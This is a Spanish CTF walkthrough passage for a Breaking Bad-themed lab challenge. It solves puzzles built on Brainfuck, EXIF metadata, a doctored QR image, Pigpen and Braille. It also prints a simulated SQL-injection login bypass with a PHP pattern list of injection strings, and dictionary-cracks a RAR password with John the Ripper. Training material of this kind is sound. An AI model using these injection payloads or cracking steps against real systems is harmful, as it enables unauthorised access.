<p>La parte final con muchas &gt;.&gt;+.&gt;---. y similares:</p>
<p>Son instrucciones tÃ­picas para imprimir caracteres uno tras otro con
. y manipular el puntero/memoria para moverse (&lt;, &gt;) y ajustar (+,
-).</p>
<p><strong>4. âœ… Ausencia de cualquier otro sÃ­mbolo</strong></p>
<p>No hay letras, nÃºmeros, espacios ni puntuaciÃ³n (mÃ¡s allÃ¡ del punto .
de Brainfuck), lo que excluye otros lenguajes.</p>
<p>Lenguajes como C, Python, Java, etc., usan muchos mÃ¡s caracteres y
estructuras (palabras clave, parÃ©ntesis, comillas, etc.).</p>
<p><strong>Brainfuck</strong> es un lenguaje de programaciÃ³n minimalista
y esotÃ©rico, diseÃ±ado para ser lo mÃ¡s simple y retorcido posible. A
pesar de su aspecto extraÃ±o, Â¡es Turing completo! Solo tiene <strong>8
instrucciones</strong>, y funciona sobre una <strong>cinta de
memoria</strong> similar a una mÃ¡quina de Turing.</p>
<p><strong>Conceptos bÃ¡sicos</strong></p>
<ul>
<li><p>Imagina una <strong>cinta</strong> de celdas (como un array) con
valores del 0 al 255.</p></li>
<li><p>Hay un <strong>puntero</strong> que seÃ±ala una celda a la
vez.</p></li>
<li><p>Solo hay <strong>8 comandos</strong> para manipular esa cinta y
el puntero.</p></li>
</ul>
<p><strong>Los 8 comandos de Brainfuck</strong></p>
<table>
<colgroup>
<col style="width: 11%" />
<col style="width: 88%" />
</colgroup>
<thead>
<tr>
<th style="text-align: center;"><strong>Comando</strong></th>
<th style="text-align: center;"><strong>Significado</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>&gt;</td>
<td>Mueve el puntero una celda a la derecha</td>
</tr>
<tr>
<td>&lt;</td>
<td>Mueve el puntero una celda a la izquierda</td>
</tr>
<tr>
<td>+</td>
<td>Incrementa el valor en la celda actual</td>
</tr>
<tr>
<td>-</td>
<td>Decrementa el valor en la celda actual</td>
</tr>
<tr>
<td>.</td>
<td>Imprime el carÃ¡cter ASCII de la celda actual</td>
</tr>
<tr>
<td>,</td>
<td>Lee un carÃ¡cter de entrada (no usado en tu cÃ³digo)</td>
</tr>
<tr>
<td>[</td>
<td>Si la celda actual vale 0, salta al comando despuÃ©s del ]
correspondiente</td>
</tr>
<tr>
<td>]</td>
<td>Si la celda actual no vale 0, vuelve al comando despuÃ©s del [
correspondiente</td>
</tr>
</tbody>
</table>
<p><strong>Ejemplo breve</strong></p>
<p>+++++ â†’ pone el valor 5 en la celda actual</p>
<p>[ â†’ comienza un bucle que se repetirÃ¡ 5 veces</p>
<p>&gt; + â†’ mueve a la siguiente celda y suma 1</p>
<p>&lt; - â†’ vuelve a la celda anterior y resta 1</p>
<p>] â†’ repite el bucle mientras la celda inicial no sea 0</p>
<p>Este ejemplo copia el valor 5 en la celda siguiente (con valor 1 al
final del bucle).</p>
<p><strong>Â¿Por quÃ© usarlo?</strong></p>
<ul>
<li><p><strong>No es prÃ¡ctico</strong>, pero es excelente para
<strong>desafÃ­os mentales</strong>, <strong>obfuscaciÃ³n</strong> o
incluso <strong>esteganografÃ­a</strong>.</p></li>
<li><p>Lo usan en <strong>retos CTF</strong>, puzzles y demostraciones
de teorÃ­a de la computaciÃ³n.</p></li>
</ul>
<p><span id="_Toc207189811" class="anchor"></span><strong>ğŸ” Fase 2 â€“
Descifrando Brainfuck</strong></p>
<p>Podemos utilizar algÃºn servicio online para descifrarlo:</p>
<p><a
href="https://md5decrypt.net/en/Brainfuck-translator/">https://md5decrypt.net/en/Brainfuck-translator/</a></p>
<p><strong>Traducido serÃ­a:</strong></p>
<p>&lt;!â€” ğŸ”</p>
<p>En la imagen del horario de esta pÃ¡gina estÃ¡ escondida la Mosca 2</p>
<p>--&gt;</p>
<p><img src="cookbook/media/image45.png"
style="width:5.90556in;height:3.13056in" /></p>
<p>Esta pista nos lleva a analizar la imagen horario.jpg</p>
<p>En la imagen horario.jpg de la pÃ¡gina localizaciÃ³n.html se han
modificado los metadatos para incluir la mosca 2 en el campo Artist:</p>
<p>exiftool -overwrite_original \</p>
<p>-Artist="HECTOR_SALAMANCA" \</p>
<p>-Comment="Esta imagen tiene algo escondido" \</p>
<p>-UserComment="El Artist es la MOSCA 2" \</p>
<p>-XPComment="ğŸ”" \</p>
<p>horario.jpg</p>
<p><span id="_Toc207189812" class="anchor"></span><strong>ğŸ“Š Fase 3 â€“
AnÃ¡lisis de metadatos</strong></p>
<p><strong>InspecciÃ³n con exiftool</strong></p>
<p>exiftool horario.jpg</p>
<p>Buscamos campos como:</p>
<ul>
<li><p>Comment</p></li>
<li><p>Lyrics</p></li>
<li><p>Encoded by</p></li>
</ul>
<p>ğŸ¯ Si encontramos algo como:</p>
<p>Artist: 'HECTOR_SALAMANCA'</p>
<p><img src="cookbook/media/image46.png"
style="width:5.4635in;height:5.60677in" /></p>
<p>â¡ï¸ Â¡Bandera obtenida! â€“ MOSCA 2= HECTOR_SALAMANCA</p>
<p><span id="_Toc207189813" class="anchor"></span><strong>âœ… Fase Final
â€“ VerificaciÃ³n</strong></p>
<p>Tras el anÃ¡lisis, el valor correcto extraÃ­do es:</p>
<p>'HECTOR_SALAMANCA'</p>
<p>En la interfaz web:</p>
<ul>
<li><p>Selecciona Mosca 2</p></li>
<li><p>Introduce 'HECTOR_SALAMANCA'</p></li>
</ul>
<p>Mensaje esperado:</p>
<p>âœ… Â¡Correcto! Has atrapado la Mosca 2 ğŸ</p>
<p>Flag aceptado: 'HECTOR_SALAMANCA'</p>
<p>Total de moscas atrapadas: 2 / 10</p>
<p><span id="_Toc207189814" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Mosca 2 atrapada: 'HECTOR_SALAMANCA'</mark></p>
<p><strong><br />
</strong></p>
<h1 id="mosca-3-cÃ³digo-qr"><strong>ğŸ Mosca 3 â€“ CÃ³digo Qr</strong></h1>
<p><strong>CategorÃ­a:</strong> CriptografÃ­a / Misc<br />
<strong>Nivel:</strong> Inicial<br />
<strong>Flag real:</strong> 'TUCO_SALAMANCA'</p>
<p><span id="_Toc207189816" class="anchor"></span><strong>ğŸ› ï¸
Herramientas necesarias</strong></p>
<ul>
<li><p>[x] Lector de cÃ³digos Qr</p></li>
<li><p>[x] Editor Hexadecimal</p></li>
</ul>
<p><span id="_Toc207189817" class="anchor"></span><strong>ğŸ“ Fase 1 â€“
LocalizaciÃ³n de la pista</strong></p>
<p>En la pÃ¡gina menÃº.html nos encontramos con una imagen de un cÃ³digo QR
que se llama menuQR.png.</p>
<p><img src="cookbook/media/image47.png"
style="width:2.03125in;height:2.03125in" /></p>
<p><span id="_Toc207189818" class="anchor"></span><strong>ğŸ” Fase 2 â€“
Leer cÃ³digo Qr</strong></p>
<p>Si lo leemos nos descubre el siguiente texto:</p>
<p><strong>Texto: Dentro de este QR encontrarÃ¡s la Mosca 3</strong></p>
<p>Este Qr estÃ¡ creado con un servicio online que permite asociar texto
a un cÃ³digo Qr:</p>
<p><a href="https://generator-qr.com/">https://generator-qr.com/</a></p>
<p><span id="_Toc207189819" class="anchor"></span><strong>ğŸ“¤ Fase 3 â€“
Analizar cÃ³digo Qr</strong></p>
<p>Si abrimos la imagen con un editor Hexadecimal para poder podemos ver
al final que el archivo ha sido modificado y encontramos la Mosca 3:</p>
<p><img src="cookbook/media/image48.png"
style="width:5.90694in;height:3.98056in" /></p>
<p>âœ… Valor confirmado. MOSCA3='TUCO_SALAMANCA'</p>
<p><span id="_Toc207189820" class="anchor"></span><strong>âœ… Fase Final
â€“ VerificaciÃ³n Web</strong></p>
<p>En la interfaz de retos:</p>
<ul>
<li><p>Selecciona <strong>Mosca 3</strong></p></li>
<li><p>Introduce 'TUCO_SALAMANCA'</p></li>
</ul>
<p>Resultado:</p>
<p>âœ… Â¡Correcto! Has atrapado la Mosca 3 ğŸ</p>
<p>Flag aceptado: 'TUCO_SALAMANCA'</p>
<p>Total de moscas atrapadas: 3 / 10</p>
<p><span id="_Toc207189821" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p><strong>Lectura del QR</strong>: anÃ¡lisis en capa de aplicaciÃ³n
(texto asociado).</p></li>
<li><p><strong>Editor Hexadecimal</strong>: anÃ¡lisis en capa de
archivo/binario, para descubrir contenido aÃ±adido fuera de
especificaciones.</p></li>
<li><p>El reto enseÃ±a la importancia de <strong>no confiar en la primera
capa visible</strong> de un objeto digital.</p></li>
<li><p>Este reto combina <strong>esteganografÃ­a bÃ¡sica en un
PNG</strong> con <strong>uso de un QR como seÃ±uelo</strong>. La clave
estaba en saber que el QR por sÃ­ solo no contenÃ­a la soluciÃ³n, sino que
habÃ­a que examinar el archivo binario con herramientas de bajo
nivel.</p></li>
</ul>
<p><span id="_Toc207189822" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Mosca 3 atrapada: 'TUCO_SALAMANCA'</mark></p>
<p><strong><br />
</strong></p>
<h1
id="mosca-4-simulaciÃ³n-de-inyecciÃ³n-sql-en-formulario-web"><strong>ğŸ
Mosca 4 â€“ SimulaciÃ³n de InyecciÃ³n SQL en Formulario Web</strong></h1>
<p><strong>CategorÃ­a:</strong> CriptografÃ­a/Web Exploitation/InyecciÃ³n
SQL (SQLi)<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Mosca capturada:</strong> 'MIKE_EHRMANTRAUT'</p>
<p><span id="_Toc207189824" class="anchor"></span><strong>ğŸ§°
Herramientas necesarias</strong></p>
<ul>
<li><p>Navegador (Firefox o Chromium)</p></li>
<li><p>DevTools para inspecciÃ³n</p></li>
<li><p>Burp Suite opcional para interceptar peticiones</p></li>
<li><p>Conocimientos bÃ¡sicos de lÃ³gica SQL y vulnerabilidades</p></li>
</ul>
<p><span id="_Toc207189825" class="anchor"></span><strong>ğŸ“ Descifrando
la pista</strong></p>
<p>En el cÃ³digo fuente de la pÃ¡gina privado.html nos encontramos este
mensaje:</p>
<p>&lt;!--</p>
<p>ğŸ”</p>
<p>á’§á’¬á’·á’¥á’ªá’§ á¯â©€á’·á’¥ á’§á’· âŠâª½âŸ”âª¾á¸á’·á’§âŸ”á’¥âª½ âŠâ˜ â˜á¯á³á’§ á’¬á’§á’£á’¥ğŸ•á’§ á’¬á’§âŸ”á’§ â˜ğŸ•á’ªâª½ğŸ•á³âŸ”á’§âŸ” á’·á’§ âª¾âª½á¯á’ªá’§
4</p>
<p>--&gt;</p>
<p><img src="cookbook/media/image49.png"
style="width:6.22637in;height:0.75in" /></p>
<p>Este mensaje tiene un cifrado Pigpen.</p>
<p>El Cifrado Pigpen, tambiÃ©n conocido como cifrado masÃ³nico o de los
francmasones, es un cifrado de sustituciÃ³n monoalfabÃ©tica que se basa en
la representaciÃ³n visual de las letras del alfabeto mediante fragmentos
de una cuadrÃ­cula o "corrales de cerdos" (de ahÃ­ su nombre, "pigpen" en
inglÃ©s significa chiquero o pocilga). Es un mÃ©todo de cifrado simple y
visualmente distintivo.</p>
<p><strong>Â¿CÃ³mo Funciona?</strong></p>
<p>El principio fundamental del cifrado Pigpen es que cada letra se
sustituye por el fragmento de la rejilla que la contiene. Para ello, se
utilizan tÃ­picamente dos rejillas principales y dos rejillas en forma de
'X', cada una dividida para contener una serie de letras. Algunas letras
se distinguen aÃ±adiendo un punto dentro de su sÃ­mbolo.</p>
<p>AquÃ­ estÃ¡n las configuraciones mÃ¡s comunes de las rejillas:</p>
<p>1. Rejillas Cuadradas (Grid)</p>
<p>Se dividen en nueve celdas cada una, como un "tres en raya".</p>
<p>Primera Rejilla (sin punto): Contiene las primeras letras del
alfabeto.</p>
<p>â”Œâ”€â”€â”€â”¬â”€â”€â”€â”¬â”€â”€â”€â”</p>
<p>â”‚ A â”‚ B â”‚ C â”‚</p>
<p>â”œâ”€â”€â”€â”¼â”€â”€â”€â”¼â”€â”€â”€â”¤</p>
<p>â”‚ D â”‚ E â”‚ F â”‚</p>
<p>â”œâ”€â”€â”€â”¼â”€â”€â”€â”¼â”€â”€â”€â”¤</p>
<p>â”‚ G â”‚ H â”‚ I â”‚</p>
<p>â””â”€â”€â”€â”´â”€â”€â”€â”´â”€â”€â”€â”˜</p>
<p>Ejemplo: La letra 'A' se representa con la esquina superior izquierda
de la cuadrÃ­cula. La 'E' se representa con el cuadrado completo sin
lados externos. La 'H' se representa con la parte inferior de la
cuadrÃ­cula.</p>
<p>Segunda Rejilla (con un punto): Contiene las siguientes letras, y los
sÃ­mbolos resultantes llevan un punto.</p>
<p>â”Œâ”€â”€â”€â”¬â”€â”€â”€â”¬â”€â”€â”€â”</p>
<p>â”‚ Jâ€¢â”‚ Kâ€¢â”‚ Lâ€¢â”‚</p>
<p>â”œâ”€â”€â”€â”¼â”€â”€â”€â”¼â”€â”€â”€â”¤</p>
<p>â”‚ Mâ€¢â”‚ Nâ€¢â”‚ Oâ€¢â”‚</p>
<p>â”œâ”€â”€â”€â”¼â”€â”€â”€â”¼â”€â”€â”€â”¤</p>
<p>â”‚ Pâ€¢â”‚ Qâ€¢â”‚ Râ€¢â”‚</p>
<p>â””â”€â”€â”€â”´â”€â”€â”€â”´â”€â”€â”€â”˜</p>
<p>Ejemplo: La letra 'J' se representa con la esquina superior izquierda
con un punto. La 'N' se representa con el cuadrado completo con un
punto.</p>
<p>2. Rejillas en Cruz (X-Grid o Tic-Tac-Toe Diagonal)</p>
<p>Se forman con lÃ­neas diagonales que crean cuatro "brazos" o "picos"
en cada rejilla.</p>
<p>Primera Rejilla X (sin punto):</p>
<p>â•² A'â•±</p>
<p>â•³</p>
<p>â•± B'â•²</p>
<p>AquÃ­, las letras se colocan en los "brazos" que se forman. Por
ejemplo, la 'S' (o a veces 'U' o 'T' dependiendo de la variante) podrÃ­a
ser el sÃ­mbolo que representa la 'V' inclinada hacia la derecha.</p>
<p>Segunda Rejilla X (con un punto): Similar a la anterior, pero los
sÃ­mbolos llevan un punto.</p>
<p>â•² C'â€¢â•±</p>
<p>â•³</p>
<p>â•± D'â€¢â•²</p>
<p><strong>Variantes</strong></p>
<p>Es importante destacar que existen varias variantes del cifrado
Pigpen. La asignaciÃ³n de letras a los "corrales" puede cambiar, y el
orden de las letras en las rejillas en 'X' a veces difiere.</p>
<p>Por lo tanto, para descifrar un mensaje Pigpen, es crucial conocer la
clave o la plantilla exacta utilizada por el emisor.</p>
<p><strong>CaracterÃ­sticas</strong></p>
<p>â€¢ Simple de usar: Una vez que se conoce la clave, la codificaciÃ³n y
decodificaciÃ³n son directas.</p>
<p>â€¢ Visualmente distintivo: Los sÃ­mbolos resultantes son Ãºnicos y no se
parecen a las letras del alfabeto latino, lo que lo hace parecer
"secreto" a primera vista.</p>
<p>â€¢ No ofrece gran seguridad: Es un cifrado muy fÃ¡cil de romper
mediante el anÃ¡lisis de frecuencia si el texto es lo suficientemente
largo, o simplemente probando las variantes conocidas del alfabeto
Pigpen.</p>
<p>â€¢ HistÃ³rico: Se hizo popular entre los francmasones en el siglo XVIII
para proteger documentos de su orden, aunque su origen podrÃ­a ser
anterior.</p>
<p>En resumen, el cifrado Pigpen es un mÃ©todo divertido y visualmente
interesante para ocultar mensajes, pero su simplicidad lo hace mÃ¡s
adecuado para acertijos o juegos que para una seguridad de comunicaciÃ³n
robusta.</p>
<p><a
href="https://www.dcode.fr/cifrado-pigpen">https://www.dcode.fr/cifrado-pigpen</a></p>
<p>El texto sin encriptar dice:</p>
<p>&lt;!--</p>
<p>ğŸ”</p>
<p>Aplica SQLi al formulario de esta pagina para encontrar la mosca
4</p>
<p>--&gt;</p>
<p><span id="_Toc207189826" class="anchor"></span><strong>ğŸŒ Acceso
inicial</strong></p>
<p>http://192.168.1.44/privado.html</p>
<p>En esta pÃ¡gina hay un formulario de acceso privado con dos
campos:</p>
<ul>
<li><p>Usuario</p></li>
<li><p>ContraseÃ±a</p></li>
</ul>
<p><img src="cookbook/media/image50.png"
style="width:4.96042in;height:3.86667in" /></p>
<p>La acciÃ³n del formulario apunta a:</p>
<p><strong>validar.php</strong></p>
<p>Este archivo procesa el POST de los campos usuario y clave.</p>
<p><span id="_Toc207189827" class="anchor"></span><strong>ğŸ”
Comportamiento del formulario</strong></p>
<ol type="1">
<li><p>Introducir credenciales vÃ¡lidas muestra un mensaje de acceso
concedido.</p></li>
<li><p>Credenciales incorrectas generan un alert("Acceso
denegado").</p></li>
</ol>
<p>El formulario simula que si el usuario introduce una cadena que
parece una inyecciÃ³n SQL (por ejemplo ' OR '1'='1), el sistema muestra
acceso concedido con el nombre del personaje Mike Ehrmantraut, como si
hubiera â€œhackeadoâ€ la entrada.</p>
<p><strong>validar.php</strong></p>
<p>&lt;?php</p>
<p>$usuario = $_POST['usuario'];</p>
<p>$clave = $_POST['clave']; // dejamos el caso original sin forzar
lowercase</p>
<p>// SimulaciÃ³n de patrÃ³n tÃ­pico de SQL Injection</p>
<p>$patrones_inyeccion = [</p>
<p>"' OR '1'='1",</p>
<p>"' or '1'='1",</p>
<p>"' OR 1=1 --",</p>
<p>"' or 1=1 --",</p>
<p>"' OR 1=1 #",</p>
<p>"' OR TRUE --",</p>
<p>"'='"</p>
<p>];</p>
<p>// Comprobamos si la cadena ingresada coincide con algÃºn patrÃ³n
tÃ­pico</p>
<p>foreach ($patrones_inyeccion as $patron) {</p>
<p>if (stripos($clave, $patron) !== false) {</p>
<p>// Simulamos acceso exitoso como si la inyecciÃ³n hubiera
funcionado</p>
<p>echo "</p>
<p>&lt;!DOCTYPE html&gt;</p>
<p>&lt;html lang='es'&gt;</p>
<p>&lt;head&gt;</p>
<p>&lt;meta charset='UTF-8'&gt;</p>
<p>&lt;title&gt;Acceso concedido&lt;/title&gt;</p>
<p>&lt;style&gt;</p>
<p>body {</p>
<p>background-color: #fef8e7;</p>
<p>font-family: 'Arial Black', Impact, sans-serif;</p>
<p>display: flex;</p>
<p>align-items: center;</p>
<p>justify-content: center;</p>
<p>height: 100vh;</p>
<p>}</p>
<p>.mensaje {</p>
<p>background-color: #d4edda;</p>
<p>border: 2px solid #155724;</p>
<p>padding: 40px;</p>
<p>border-radius: 15px;</p>
<p>text-align: center;</p>
<p>color: #155724;</p>
<p>font-size: 24px;</p>
<p>box-shadow: 0 0 10px rgba(0,0,0,0.2);</p>
<p>}</p>
<p>&lt;/style&gt;</p>
<p>&lt;/head&gt;</p>
<p>&lt;body&gt;</p>
<p>&lt;div class='mensaje'&gt;</p>
<p>âœ… Acceso concedido&lt;br&gt;&lt;br&gt;</p>
<p>&lt;strong&gt;Â¡Bienvenido,
Mike_Ehrmantraut!&lt;/strong&gt;&lt;br&gt;</p>
<p>&lt;strong&gt;Flag:&lt;/strong&gt; Mike_Ehrmantraut</p>
<p>&lt;/div&gt;</p>
<p>&lt;/body&gt;</p>
<p>&lt;/html&gt;</p>
<p>";</p>
<p>exit;</p>
<p>}</p>
<p>}</p>
<p>// Si no se detectÃ³ inyecciÃ³n</p>
<p>echo "&lt;script&gt;alert('Acceso denegado.');
window.history.back();&lt;/script&gt;";</p>
<p>?&gt;</p>
<p><span id="_Toc207189828" class="anchor"></span><strong>ğŸ” AnÃ¡lisis de
vulnerabilidad</strong></p>
<p>El formulario no valida el contenido del campo clave de forma segura.
Internamente, el script compara el valor ingresado contra una serie de
patrones conocidos de inyecciÃ³n SQL, como:</p>
<ul>
<li><p>' OR '1'='1</p></li>
<li><p>' OR TRUE --</p></li>
<li><p>'='</p></li>
</ul>
<p>Si alguno de estos aparece en la cadena de entrada, se simula un
bypass y se concede acceso.</p>
<p><span id="_Toc207189829" class="anchor"></span><strong>ğŸ§ª EjecuciÃ³n
de la inyecciÃ³n</strong></p>
<p>En el formulario:</p>
<ul>
<li><p>Usuario: cualquier valor (admin, test, vacÃ­o)</p></li>
<li><p>ContraseÃ±a: ' OR '1'='1</p></li>
</ul>
<p>âš ï¸ Es importante escribirlo <strong>exactamente</strong> asÃ­, con
espacios y comillas simples:</p>
<p>' OR '1'='1</p>
<p>Las comillas y los espacios deben estar intactos, ya que el sistema
realiza una comparaciÃ³n con patrones precisos (stripos), no expresiones
regulares ni sanitizaciÃ³n avanzada.</p>
<p><span id="_Toc207189830" class="anchor"></span><strong>âœ… Resultado
esperado</strong></p>
<p>Tras enviar los datos, el servidor responde con una pÃ¡gina distinta
que contiene:</p>
<p>âœ… Acceso concedido</p>
<p>Â¡Bienvenido, Mike_Ehrmantraut!</p>
<p>Flag: MIKE_EHRMANTRAUT</p>
<p>Esto representa la <strong>captura de la Mosca 4</strong>.</p>
<p><img src="cookbook/media/image51.png"
style="width:5.38323in;height:2.86458in" /></p>
<p><span id="_Toc207189831" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>No se requiere acceso a base de datos real.</p></li>
<li><p>El sistema simula el comportamiento de una inyecciÃ³n SQL
utilizando coincidencias estÃ¡ticas.</p></li>
<li><p>Este reto educa en patrones clÃ¡sicos de SQLi y en la importancia
del escaping y la validaciÃ³n del lado servidor.</p></li>
</ul>
<p><span id="_Toc207189832" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Mosca 4 atrapada: 'MIKE_EHRMANTRAUT'</mark></p>
<p>El jugador puede registrarla en el sistema central o apuntarla
manualmente segÃºn el entorno del CTF.</p>
<p><strong><br />
</strong></p>
<h1
id="mosca-5-crackeo-de-contraseÃ±a-de-archivo-protegido-.rar"><strong>ğŸ
Mosca 5 â€“ Crackeo de ContraseÃ±a de Archivo Protegido
(.rar)</strong></h1>
<p><strong>CategorÃ­a:</strong> Cripto / Fuerza bruta simulada<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Mosca capturada:</strong> Jesse_Pinkman</p>
<p><span id="_Toc207189834" class="anchor"></span><strong>ğŸ§°
Herramientas necesarias</strong></p>
<ul>
<li><p>John the Ripper</p></li>
<li><p>Terminal Linux / macOS (o Windows con WSL)</p></li>
<li><p>Archivos del reto: algo.rar y passwords.txt</p></li>
</ul>
<p><span id="_Toc207189835" class="anchor"></span><strong>ğŸ“ Contenido
inicial</strong></p>
<p>Dentro de la carpeta â€œarchivosâ€ del entorno web hay dos archivos:</p>
<ul>
<li><p>algo.rar: archivo comprimido protegido por contraseÃ±a</p></li>
<li><p>passwords.txt: contiene una lista de 200 posibles
contraseÃ±as</p></li>
</ul>
<p><span id="_Toc207189836" class="anchor"></span><strong>ğŸ§  Enunciado
oculto</strong></p>
<p>En el cÃ³digo fuente de privado.html aparece una pista con estilo
narco-retorcido. Se indica que hay un archivo testarudo que no se abre
sin la clave correcta, y que â€œJohnâ€ sabe destripar secretos:</p>
<p>&lt;!--</p>
<p>ğŸ”</p>
<p>AjÃºa, valedor...</p>
<p>En esta carpeta hay un algo bien testarudo que no se deja abrir nomÃ¡s
porque sÃ­.</p>
<p>Hay tambiÃ©n una lista con 200 posibles llavesâ€¦ pero solo una hace que
el candado truene.</p>
<p>Si quieres saber quÃ© se esconde ahÃ­ dentro, tendrÃ¡s que ponerte
trucha.</p>
<p>Pide ayuda a John, ese que es bueno pa' destripar secretos...</p>
<p>Usa la lista con maÃ±a y ve probando. Si das con la clave buena, algo
saldrÃ¡.</p>
<p>Â¿TendrÃ¡s lo que se necesita paâ€™ sacar algo de su escondite?</p>
<p>--&gt;</p>
<p>Esto nos lleva directamente al uso de la herramienta <strong>John the
Ripper</strong>, que incluye funciones para crackear archivos .rar
protegidos.</p>
<p>Veamos el paso a paso para usar John the Ripper y descubrir cuÃ¡l de
las contraseÃ±as del archivo passwords.txt abre el archivo algo.rar.</p>
<p>Archivos:</p>
<ul>
<li><p>algo.rar â†’ archivo protegido</p></li>
<li><p>passwords.txt â†’ lista de +200 contraseÃ±as posibles</p></li>
</ul>
<p><span id="_Toc207189837" class="anchor"></span><strong>ğŸ§ª
Procedimiento paso a paso</strong></p>
<p><strong>1. Extraer el hash del archivo .rar</strong></p>
<p>Usamos el mÃ³dulo rar2john para convertir el archivo comprimido en un
hash legible por John:</p>
<p>rar2john algo.rar &gt; rar_hash.txt</p>
<p><img src="cookbook/media/image52.png"
style="width:4.55208in;height:1.55208in" /></p>
<p>Esto genera un archivo rar_hash.txt con la firma hash del archivo
comprimido.</p>
<p><strong>2. Ejecutar el cracking con diccionario</strong></p>
<p>Ahora lanzamos John usando la lista de contraseÃ±as:</p>
<p>john --wordlist=passwords.txt rar_hash.txt</p>
<p><img src="cookbook/media/image53.png"
style="width:5.90556in;height:1.45764in" /></p>
<p>Este comando empieza a probar todas las combinaciones de
passwords.txt contra el hash generado del archivo .rar.</p>
<p><strong>3. Ver la contraseÃ±a encontrada</strong></p>
<p>Una vez terminado el proceso, verificamos cuÃ¡l fue la clave con:</p>
<p>john --show rar_hash.txt</p>
<p><img src="cookbook/media/image54.png"
style="width:3.58333in;height:1in" /></p>
<p><span id="_Toc207189838" class="anchor"></span><strong>ğŸ§©
Resultado</strong></p>
<p>John revela que la contraseÃ±a correcta para descomprimir algo.rar
es:</p>
<p>mW5#nC4!vE</p>
<p>Al usar esta clave con cualquier programa de descompresiÃ³n (7-Zip,
WinRAR, etc.), el archivo se desbloquea y encontramos la <strong>Mosca
5</strong>:</p>
<p><img src="cookbook/media/image55.png"
style="width:2.58333in;height:1.13542in" /></p>
<p><mark>Mosca 5 atrapada: 'Jesse_Pinkman'</mark></p>
<p><span id="_Toc207189839" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>El reto demuestra un uso realista y prÃ¡ctico de cracking de
contraseÃ±as mediante diccionario.</p></li>
<li><p>Se plantea una simulaciÃ³n controlada del proceso de fuerza bruta
usando herramientas especializadas.</p></li>
<li><p>El reto es educativo sobre seguridad y cifrado en archivos
.rar.</p></li>
</ul>
<p><strong><br />
</strong></p>
<h1 id="mosca-6-descompresiÃ³n-braille-oculto-en-imagen"><strong>ğŸ Mosca
6 â€“ DescompresiÃ³n + Braille oculto en imagen</strong></h1>
<p><strong>CategorÃ­a:</strong> EsteganografÃ­a / OCR / Cripto
visual<br />
<strong>Nivel:</strong> Intermedio<br />
<strong>Mosca capturada:</strong> Metanfetamina</p>
<p><span id="_Toc207189841" class="anchor"></span><strong>ğŸ“ Contenido
de la carpeta</strong></p>
<ul>
<li><p>PIN.png: imagen simulando calor por contacto (efecto tÃ©rmico de
pantalla)</p></li>
<li><p>PAN.rar: archivo comprimido protegido por contraseÃ±a</p></li>
</ul>
<p><span id="_Toc207189842" class="anchor"></span><strong>ğŸ” AnÃ¡lisis de
la pista</strong></p>
<p>En el cÃ³digo fuente de menu.html, se encuentra una rima en estilo
corrido mexicano:</p>
<p>&lt;!â€”</p>
<p>ğŸ”</p>
<p>"Entre el PIN y el PAN hay maÃ±a y no desayuno,</p>
<p>uno se ve bonito, pero trae truco alguno.</p>
<p>El PIN, que parece inocente retrato,</p>
<p>esconde en sus pÃ­xeles un dato muy sensato.</p>
<p>No lo mires nomÃ¡s, Ã©chale ojo de aguililla,</p>
<p>que la clave paâ€™ abrir el PAN estÃ¡ bien escondidilla.</p>
<p>Y el PAN, tan calladito, no suelta su manjar,</p>
<p>si no le das la clave que el PIN te va a soltar.</p>
<p>AsÃ­ que ponte trucha, no te vayas a confiar,</p>
<p>que del PIN sale la claveâ€¦ Â¡y el PAN te va a alimentar!"</p>
<p>--&gt;</p>
<p>Esto sugiere que:</p>
<ul>
<li><p>La <strong>clave</strong> para abrir PAN.rar estÃ¡ en
PIN.png</p></li>
<li><p>El <strong>contenido oculto</strong> del archivo comprimido es la
Mosca 6</p></li>
</ul>
<p><span id="_Toc207189843" class="anchor"></span><strong>ğŸ§ª Paso a paso
tÃ©cnico</strong></p>
<p><strong>1. Identificar el PIN tÃ©rmico</strong></p>
<p>Este mensaje nos lleva a la carpeta archivos donde tenemos PIN.png y
PAN.rar. La imagen PIN.png simula una pantalla con efecto tÃ©rmico. Al
observar la intensidad del color en cada dÃ­gito, se deduce la secuencia
mÃ¡s reciente pulsada (mÃ¡s roja, mÃ¡s reciente).</p>
<p><img src="cookbook/media/image56.png"
style="width:3.58056in;height:3.58056in" /></p>
<p>Resultado observado:</p>
<p>PIN = 9348</p>
<p><strong>2. Descomprimir PAN.rar con el PIN como clave</strong></p>
<p>Usamos 7-Zip, WinRAR o terminal para intentar descomprimir con
contraseÃ±a:</p>
<p>unrar x PAN.rar</p>
<p>Cuando solicita clave, ingresamos:</p>
<p>9348</p>
<p>El archivo se descomprime correctamente, revelando:</p>
<p>PAN.txt: contiene un mensaje en Braille Unicode</p>
<p><img src="cookbook/media/image57.png"
style="width:3.58056in;height:1.42708in" /></p>
<p><strong>3. InterpretaciÃ³n del Braille</strong></p>
<p>Contenido de PAN.txt:</p>
<p>â â ‘â â â â ‹â ‘â â â â Šâ â </p>
<p>Esto es Braille Unicode. Vamos a probar a descifrarlo con alguno de
los servicios que hay online.</p>
<p>Utilizamos traductores como:</p>
<p><a
href="https://openl.io/es/translate/braille">https://openl.io/es/translate/braille</a></p>
<p><a
href="https://www.brailletranslator.org/es.html">https://www.brailletranslator.org/es.html</a></p>
<p><a
href="https://www.brailletranslator.org/es.html">https://www.brailletranslator.org/es.html</a></p>
<p><a
href="https://www.braillecaster.net/">https://www.braillecaster.net/</a></p>
<blockquote>
<p><img src="cookbook/media/image58.png"
style="width:4.98958in;height:1.05294in" /></p>
<p><img src="cookbook/media/image59.png"
style="width:4.86108in;height:2.97917in" /></p>
</blockquote>
<p>El texto â â ‘â â â â ‹â ‘â â â â Šâ â  significa Metanfetamina</p>
<p><span id="_Toc207189844" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Mosca 6 atrapada: 'Metanfetamina'</mark></p>
<p><span id="_Toc207189845" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
